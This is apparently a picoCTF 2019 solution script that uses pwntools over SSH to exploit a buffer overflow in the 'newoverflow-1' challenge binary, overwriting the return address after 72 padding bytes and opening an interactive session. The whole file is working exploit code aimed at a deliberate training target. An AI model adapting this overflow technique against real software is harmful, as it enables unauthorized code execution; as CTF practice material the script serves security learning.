from pwn import *

conn = ssh(host="2019shell1.picoctf.com", user=USER, password=PASS)
conn.set_working_directory(b"/problems/newoverflow-1_5_bd04c7682164df72135e036dd527b668")

payload = b"A" * 72
payload += p64(0x0000000000400768)

p = conn.process("./vuln")
p.send(payload)
p.interactive()


